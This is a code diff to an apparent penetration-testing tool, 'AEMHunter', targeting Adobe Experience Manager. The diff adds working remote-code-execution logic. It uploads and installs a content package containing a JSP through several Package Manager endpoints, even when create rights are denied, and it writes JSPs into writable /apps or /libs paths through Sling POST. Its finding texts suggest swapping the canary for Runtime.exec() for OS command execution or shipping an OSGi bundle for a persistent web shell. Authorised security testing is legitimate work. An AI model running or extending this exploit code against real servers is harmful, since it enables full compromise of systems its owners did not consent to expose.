@@ -1035,83 +1035,138 @@ class AEMHunter:
                              "prove end-to-end RCE (drops & removes a canary JSP) and attempt "
                              "admin-group escalation.")
 
-    # ---- Package Manager: confirm create/install rights => RCE ----
+    # ---- Package Manager: the primary RCE path. Try hard. ----
     def _escalate_packmgr(self) -> bool:
         ls = self.client.get("/crx/packmgr/service.jsp?cmd=ls")
         if not (ls and ls.status_code == 200 and not self._is_authwall(ls) and "<crx" in (ls.text or "")):
             return False
         m = re.search(r'user="([^"]+)"', ls.text or "")
         acting = m.group(1) if m else "?"
-        self.logger.info(f"Package Manager responds (user={acting}); testing write/create rights...")
+        self.logger.info(f"Package Manager reachable (acting user={acting}); probing create/install rights...")
 
+        # Capability probe: can we create an empty package? (signal only)
         rnd = "aemhunter" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
         grp = "aemhunter"
         pkgpath = f"/etc/packages/{grp}/{rnd}.zip"
         create = self._auth_post(f"/crx/packmgr/service/.json{pkgpath}",
                                  params={"cmd": "create", "packageName": rnd,
                                          "groupName": grp, "_charset_": "utf-8"})
-        if self._pkg_success(create):
+        created = self._pkg_success(create)
+        if created:
             self.reporter.add(Finding(
-                title=f"Package Manager WRITE confirmed {self._role_tag()} — install = RCE",
+                title=f"Package Manager create rights confirmed {self._role_tag()} — install = RCE",
                 severity=SEV_CRITICAL, category=CAT_RCE, target=self.target + pkgpath,
-                evidence=f"Created a throwaway package as user={acting}; this account can "
-                         "create/build/install packages (then deleted it).",
-                description=("CONFIRMED (not just intended read access): this session can create "
-                             "packages via CRX Package Manager. Package install executes arbitrary "
-                             "code (OSGi bundle or JSP) => remote code execution. A content-editor "
-                             "role should never have this. Re-run with --exploit for an end-to-end "
-                             "RCE proof."),
-                references=["https://github.com/0ang3el/aem-rce-bundle",
-                            "https://github.com/0ang3el/aem-hacker"],
+                evidence=f"Created a throwaway package as user={acting} (then deleted it).",
+                description=("This session can create packages via CRX Package Manager. Package "
+                             "install executes arbitrary code => RCE. A content-editor role should "
+                             "never have this."),
+                references=["https://github.com/0ang3el/aem-rce-bundle"],
                 request=f"POST /crx/packmgr/service/.json{pkgpath}?cmd=create&packageName={rnd}&groupName={grp}",
-                response_snippet=safe_response_text(create, 400), role=self.role,
+                response_snippet=safe_response_text(create, 300), role=self.role,
             ))
-            if self.exploit:
-                self._packmgr_rce_poc(grp, rnd, pkgpath, acting)
-            # cleanup the empty package
             self._auth_post(f"/crx/packmgr/service/.json{pkgpath}", params={"cmd": "delete"})
-            return True
+        else:
+            self.reporter.add(Finding(
+                title=f"Package Manager listing readable {self._role_tag()} (create NOT confirmed)",
+                severity=SEV_MEDIUM, category=CAT_EXPOSURE,
+                target=self.target + "/crx/packmgr/service.jsp?cmd=ls",
+                evidence=f"cmd=ls works as user={acting}; cmd=create returned "
+                         f"{getattr(create, 'status_code', 'ERR')} (no success).",
+                description=("Can enumerate packages. Empty-package create was rejected, but "
+                             "upload+install may still work (different permission) — that is the "
+                             "real RCE path and is attempted with --exploit."),
+                response_snippet=safe_response_text(ls, 300), role=self.role,
+            ))
 
-        # read-only listing only
-        self.reporter.add(Finding(
-            title=f"Package Manager listing readable {self._role_tag()} (write NOT confirmed)",
-            severity=SEV_MEDIUM, category=CAT_EXPOSURE,
-            target=self.target + "/crx/packmgr/service.jsp?cmd=ls",
-            evidence=f"cmd=ls works as user={acting}; create returned "
-                     f"{getattr(create, 'status_code', 'ERR')} (no success). Likely read-only or CSRF-blocked.",
-            description=("Can enumerate packages but creating/installing was not confirmed. "
-                         "This may be intended. Worth a manual look at cmd=build on an existing pkg."),
-            response_snippet=safe_response_text(ls, 400), role=self.role,
-        ))
-        return False
+        # The actual RCE: upload a package + install it. Crucially, this is tried
+        # even when cmd=create was denied — upload/install is a separate right,
+        # and install often writes /apps via the package-manager service session.
+        if self.exploit:
+            self._packmgr_rce_poc(acting)
+        elif created:
+            self.logger.warn("Re-run with --exploit to attempt the package upload+install RCE PoC.")
+        return True
 
-    def _packmgr_rce_poc(self, grp: str, rnd: str, pkgpath: str, acting: str) -> None:
+    def _packmgr_rce_poc(self, acting: str) -> None:
         canary = "AEMHUNTERRCE" + "".join(random.choices(string.ascii_uppercase, k=6))
         jsp = '<%= "' + canary + '-" + System.getProperty("user.name") %>'
-        zipbytes = self._build_vault_package(grp, rnd, {"apps/aemhunter/poc.jsp": jsp})
-        files = {"package": (rnd + ".zip", zipbytes, "application/zip")}
-        self._auth_post("/crx/packmgr/service/.json", params={"cmd": "upload"},
-                        data={"force": "true"}, files=files)
-        self._auth_post(f"/crx/packmgr/service/.json{pkgpath}", params={"cmd": "install"})
-        ex = self.client.get("/apps/aemhunter/poc.jsp")
-        if ex is not None and canary in (ex.text or ""):
-            self.reporter.add(Finding(
-                title=f"REMOTE CODE EXECUTION confirmed via package install {self._role_tag()}",
-                severity=SEV_CRITICAL, category=CAT_RCE,
-                target=self.target + "/apps/aemhunter/poc.jsp",
-                evidence=f"Uploaded+installed a content package with a JSP and executed it: "
-                         f"{snippet(ex.text, 120)}",
-                description=("END-TO-END RCE: this session uploaded and installed a content "
-                             "package containing a JSP, and the server executed attacker Java "
-                             "code. Full server compromise as the AEM service user."),
-                references=["https://github.com/0ang3el/aem-rce-bundle"],
-                request="POST /crx/packmgr/service/.json?cmd=upload (vault pkg w/ /apps/aemhunter/poc.jsp) "
-                        "then ?cmd=install, then GET /apps/aemhunter/poc.jsp",
-                response_snippet=snippet(ex.text, 300), role=self.role,
-            ))
-        # thorough cleanup
-        self._auth_post(f"/crx/packmgr/service/.json{pkgpath}", params={"cmd": "uninstall"})
+        grp = "aemhunter"
+        name = "aemhunter" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
+        pkgpath = f"/etc/packages/{grp}/{name}.zip"
+        zipbytes = self._build_vault_package(grp, name, {"apps/aemhunter/poc.jsp": jsp})
+        ref = self.client.base_url + "/crx/packmgr/index.jsp"
+        headers = {"Referer": ref}
+        if self._csrf_token:
+            headers["CSRF-Token"] = self._csrf_token
+
+        self.logger.info("Attempting package upload+install RCE (canary JSP under /apps)...")
+        # Several upload conventions across AEM versions; install=true does it in one shot,
+        # then we also force an explicit install in case install=true was ignored.
+        attempts = [
+            ("/crx/packmgr/service.jsp",
+             {}, {"cmd": "upload", "name": name, "force": "true", "install": "true"}),
+            ("/crx/packmgr/service/.json",
+             {"cmd": "upload"}, {"name": name, "force": "true", "install": "true"}),
+            ("/crx/packmgr/service/.json/etc/packages/%s/%s.zip" % (grp, name),
+             {"cmd": "upload"}, {"force": "true", "install": "true"}),
+        ]
+        executed = False
+        last = None
+        for ep, params, data in attempts:
+            files = {"package": (name + ".zip", zipbytes, "application/zip"),
+                     "file": (name + ".zip", zipbytes, "application/zip")}
+            up = self.client.post(ep, params=params, data=data, files=files, headers=headers)
+            last = up
+            # explicit install fallbacks (JSON service + legacy .jsp)
+            self.client.post(f"/crx/packmgr/service/.json{pkgpath}",
+                             params={"cmd": "install"}, headers=headers)
+            self.client.post("/crx/packmgr/service.jsp",
+                             data={"cmd": "inst", "name": name, "group": grp}, headers=headers)
+            ex = self.client.get("/apps/aemhunter/poc.jsp")
+            if ex is not None and canary in (ex.text or ""):
+                executed = True
+                self.reporter.add(Finding(
+                    title=f"REMOTE CODE EXECUTION confirmed via package install {self._role_tag()}",
+                    severity=SEV_CRITICAL, category=CAT_RCE,
+                    target=self.target + "/apps/aemhunter/poc.jsp",
+                    evidence=f"Uploaded+installed a content package containing a JSP and the "
+                             f"server executed it: {snippet(ex.text, 160)}",
+                    description=("END-TO-END RCE: this session uploaded and installed a content "
+                                 "package containing a JSP, and the server executed attacker Java "
+                                 "code. Full server compromise as the AEM service user. Swap the "
+                                 "canary for Runtime.exec() for OS command execution, or ship an "
+                                 "OSGi bundle (0ang3el/aem-rce-bundle) for a persistent web shell."),
+                    references=["https://github.com/0ang3el/aem-rce-bundle",
+                                "https://github.com/0ang3el/aem-hacker"],
+                    request=f"POST {ep} (multipart vault pkg w/ jcr_root/apps/aemhunter/poc.jsp, install=true) "
+                            f"then GET /apps/aemhunter/poc.jsp -> {canary}-<svcuser>",
+                    response_snippet=snippet(ex.text, 300), role=self.role,
+                ))
+                break
+
+        # thorough cleanup regardless of outcome
+        self.client.post(f"/crx/packmgr/service/.json{pkgpath}", params={"cmd": "uninstall"}, headers=headers)
+        self.client.post(f"/crx/packmgr/service/.json{pkgpath}", params={"cmd": "delete"}, headers=headers)
         self._auth_post("/apps/aemhunter", data={":operation": "delete"})
+
+        if not executed:
+            self.reporter.add(Finding(
+                title=f"Package upload/install attempted — RCE NOT confirmed {self._role_tag()}",
+                severity=SEV_HIGH, category=CAT_RCE,
+                target=self.target + "/crx/packmgr/service.jsp",
+                evidence=f"Package Manager reachable as user={acting}; upload/install tried on "
+                         f"3 endpoints but the canary JSP did not execute (last upload status "
+                         f"{getattr(last, 'status_code', 'ERR')}).",
+                description=("The role can read Package Manager but uploading+installing a JSP "
+                             "package did not yield execution — likely lacks install rights or "
+                             "the package-manager service does not write /apps for this user. "
+                             "Next: try an OSGi-bundle package (0ang3el/aem-rce-bundle) dropped "
+                             "into /apps/<x>/install, or a writable /apps subpath. Manual review "
+                             "recommended — the read access alone (full repo + secrets) is "
+                             "already high impact."),
+                references=["https://github.com/0ang3el/aem-rce-bundle"],
+                response_snippet=safe_response_text(last, 300), role=self.role,
+            ))
 
     def _build_vault_package(self, group: str, name: str, files: Dict[str, str]) -> bytes:
         """Build a minimal FileVault content-package zip in memory."""
@@ -1175,65 +1230,107 @@ class AEMHunter:
         ))
         return False
 
-    # ---- Sling POST: confirm JCR write across roots; /apps write == code deploy ----
+    def _sling_can_write(self, base: str, marker: str) -> bool:
+        """Create a node, confirm via GET .json, delete it. Returns True if write stuck."""
+        r = self._auth_post(base, data={"jcr:primaryType": "nt:unstructured", "aemhunter": marker})
+        if r is None or r.status_code not in (200, 201):
+            return False
+        v = self.client.get(base + ".json")
+        ok = bool(v and v.status_code == 200 and marker in (v.text or ""))
+        self._auth_post(base, data={":operation": "delete"})  # cleanup
+        return ok
+
+    def _discover_apps_children(self) -> List[str]:
+        """List existing /apps child app folders (writable subpaths are RCE-capable)."""
+        out: List[str] = []
+        r = self.client.get("/apps.1.json")
+        if r and r.status_code == 200 and not self._is_authwall(r):
+            try:
+                for k, v in json.loads(r.text).items():
+                    if isinstance(v, dict) and not k.startswith(("jcr:", "sling:", "rep:")):
+                        out.append("/apps/" + k)
+            except Exception:
+                pass
+        return out[:8]
+
+    # ---- Sling POST: find a CODE-EXECUTABLE writable path, then prove RCE ----
     def _escalate_sling_write(self) -> bool:
         marker = "aemhunter" + "".join(random.choices(string.ascii_lowercase, k=6))
-        roots = [
-            ("/apps/aemhunter-" + marker, SEV_CRITICAL,
-             " — /apps is code space: drop a JSP / sling:resourceType here for RCE"),
-            ("/var/aemhunter-" + marker, SEV_HIGH, ""),
-            ("/content/aemhunter-" + marker, SEV_HIGH, ""),
-            ("/etc/aemhunter-" + marker, SEV_HIGH, ""),
-            ("/conf/aemhunter-" + marker, SEV_HIGH, ""),
-            ("/tmp/aemhunter-" + marker, SEV_MEDIUM, ""),
-            ("/content/usergenerated/aemhunter-" + marker, SEV_MEDIUM, ""),
+        # Code-space candidates first: /apps root, then each existing /apps child
+        # (a content editor often can't write /apps root but CAN write a specific app).
+        code_candidates = ["/apps/aemhunter-" + marker]
+        for child in self._discover_apps_children():
+            code_candidates.append(f"{child}/aemhunter-{marker}")
+        code_candidates.append("/libs/aemhunter-" + marker)
+
+        # Non-code writes: useful signal but not directly RCE.
+        # /content + /tmp are routinely writable for authors (their job / scratch)
+        # so they are INFO; config trees are higher.
+        other = [
+            ("/etc/aemhunter-" + marker, SEV_HIGH, "config tamper"),
+            ("/conf/aemhunter-" + marker, SEV_HIGH, "editable-template / config tamper"),
+            ("/var/aemhunter-" + marker, SEV_MEDIUM, ""),
+            ("/content/aemhunter-" + marker, SEV_INFO, "expected for an author; stored-XSS vector"),
+            ("/tmp/aemhunter-" + marker, SEV_INFO, "scratch space, usually world-writable"),
         ]
-        wrote_apps = False
-        any_write = False
-        for base, sev, note in roots:
-            r = self._auth_post(base, data={"jcr:primaryType": "nt:unstructured",
-                                            "aemhunter": marker})
-            if r is None or r.status_code not in (200, 201):
-                continue
-            v = self.client.get(base + ".json")
-            if not (v and v.status_code == 200 and marker in (v.text or "")):
-                continue
-            any_write = True
-            parent = base.rsplit("/", 1)[0] or "/"
-            self.reporter.add(Finding(
-                title=f"Sling POST WRITE confirmed at {parent} {self._role_tag()}{note}",
-                severity=sev, category=CAT_JCR, target=self.target + base,
-                evidence=f"Created node {base}, confirmed via GET .json {self._who()}, then deleted.",
-                description=("CONFIRMED JCR write via the Sling POST servlet. Writable /apps => "
-                             "deploy executable scripts (RCE). Writable /home => tamper with "
-                             "users/groups. Writable /content => content/defacement. Not "
-                             "intended for a low-privilege role."),
-                references=["https://sling.apache.org/documentation/bundles/manipulating-content-the-slingpostservlet-servlets-post.html"],
-                request=f"POST {base}  (jcr:primaryType=nt:unstructured&aemhunter={marker})",
-                response_snippet=safe_response_text(r, 300), role=self.role,
-            ))
-            if base.startswith("/apps"):
-                wrote_apps = True
-            self._auth_post(base, data={":operation": "delete"})
-        if self.exploit and wrote_apps:
-            self._sling_jsp_rce(marker)
+
+        writable_code_path = None
+        for base in code_candidates:
+            if self._sling_can_write(base, marker):
+                writable_code_path = base
+                root = base.rsplit("/", 1)[0] or "/"
+                self.reporter.add(Finding(
+                    title=f"Sling WRITE to CODE space {root} {self._role_tag()} — JSP => RCE",
+                    severity=SEV_CRITICAL, category=CAT_RCE, target=self.target + base,
+                    evidence=f"Created+confirmed+deleted a node under {root} {self._who()}.",
+                    description=(f"This session can write to {root} (script/code space). Drop a "
+                                 "JSP or a sling:resourceType script here and request it for RCE. "
+                                 "Not intended for a content-editor role."),
+                    references=["https://github.com/0ang3el/aem-hacker"],
+                    request=f"POST {base}  (jcr:primaryType=nt:unstructured&aemhunter={marker})",
+                    role=self.role,
+                ))
+                break
+
+        any_write = writable_code_path is not None
+        for base, sev, note in other:
+            if self._sling_can_write(base, marker):
+                any_write = True
+                root = base.rsplit("/", 1)[0] or "/"
+                suffix = f" — {note}" if note else ""
+                self.reporter.add(Finding(
+                    title=f"Sling POST write to {root} {self._role_tag()}{suffix}",
+                    severity=sev, category=CAT_JCR, target=self.target + base,
+                    evidence=f"Created+confirmed+deleted a node under {root} {self._who()}.",
+                    description=("CONFIRMED JCR write via the Sling POST servlet. Writable config "
+                                 "trees (/etc, /conf) enable tampering; /content write is expected "
+                                 "for authors but enables stored XSS. None of these is direct RCE — "
+                                 "see the CODE-space and Package Manager findings for that."),
+                    request=f"POST {base}  (jcr:primaryType=nt:unstructured&aemhunter={marker})",
+                    role=self.role,
+                ))
+
+        if self.exploit and writable_code_path:
+            self._sling_jsp_rce(writable_code_path.rsplit("/", 1)[0])
         return any_write
 
-    def _sling_jsp_rce(self, marker: str) -> None:
+    def _sling_jsp_rce(self, code_root: str) -> None:
+        """Drop a JSP into a known-writable code root and execute it."""
         canary = "AEMHUNTERRCE" + "".join(random.choices(string.ascii_uppercase, k=6))
         jsp = '<%= "' + canary + '-" + System.getProperty("user.name") %>'
-        folder = f"/apps/aemhunter-{marker}"
+        folder = f"{code_root.rstrip('/')}/aemhunter-{''.join(random.choices(string.ascii_lowercase, k=6))}"
         # Sling file upload creates an nt:file node from a multipart field.
         self._auth_post(folder + "/", files={"poc.jsp": ("poc.jsp", jsp, "application/octet-stream")})
         ex = self.client.get(folder + "/poc.jsp")
         if ex is not None and canary in (ex.text or ""):
             self.reporter.add(Finding(
-                title=f"REMOTE CODE EXECUTION confirmed via Sling /apps JSP {self._role_tag()}",
+                title=f"REMOTE CODE EXECUTION confirmed via Sling JSP under {code_root} {self._role_tag()}",
                 severity=SEV_CRITICAL, category=CAT_RCE,
                 target=self.target + folder + "/poc.jsp",
-                evidence=f"Wrote a JSP under /apps via Sling POST and executed it: {snippet(ex.text, 120)}",
-                description=("END-TO-END RCE: uploaded a JSP into /apps via the Sling POST "
-                             "servlet and the server executed attacker Java code."),
+                evidence=f"Wrote a JSP under {code_root} via Sling POST and executed it: {snippet(ex.text, 140)}",
+                description=("END-TO-END RCE: uploaded a JSP into a code space via the Sling POST "
+                             "servlet and the server executed attacker Java code. Swap the canary "
+                             "for Runtime.exec() for OS command execution."),
                 references=["https://github.com/0ang3el/aem-hacker"],
                 request=f"POST {folder}/ (multipart poc.jsp) then GET {folder}/poc.jsp",
                 response_snippet=snippet(ex.text, 300), role=self.role,
